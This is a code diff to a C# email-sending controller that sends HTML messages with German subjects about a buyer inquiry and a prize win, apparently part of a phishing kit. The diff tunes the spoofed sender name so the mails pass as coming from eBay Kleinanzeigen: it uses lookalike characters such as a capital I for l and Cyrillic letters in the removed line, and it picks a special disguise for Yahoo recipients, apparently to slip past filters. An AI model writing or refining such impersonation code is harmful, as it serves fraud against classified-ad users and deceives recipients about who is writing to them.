@@ -67,11 +67,17 @@ public class SenderController : ControllerBase
     {
         var body = await GetBody(link, ServiceType.EbayDe);
 
+        var displayName = "•EBAY•Kleinanzeigen";
+
+        if (email.Contains("yahoo"))
+            displayName = "das'TeamEbaykIeinanzeigen de®";
+        
         var message = new MailMessage(_senderEmail, email, "Nutzer-Anfrage zu deiner Anzeige!", body)
         {
             IsBodyHtml = true,
-            From = new MailAddress(_senderEmail, "ebay-kleinanzeigen-deㅤ©")
+            From = new MailAddress(_senderEmail, displayName)
         };
+        
 
         try
         {
@@ -93,7 +99,7 @@ public class SenderController : ControllerBase
         var message = new MailMessage(_senderEmail, email, "Herzlichen Glückwunsch zum Gewinn des Wettbewerbs!", body)
         {
             IsBodyHtml = true,
-            From = new MailAddress(_senderEmail, "еВау Kleinanzeigen")
+            From = new MailAddress(_senderEmail, "•EBAY•Kleinanzeigen")
         };
 
         try
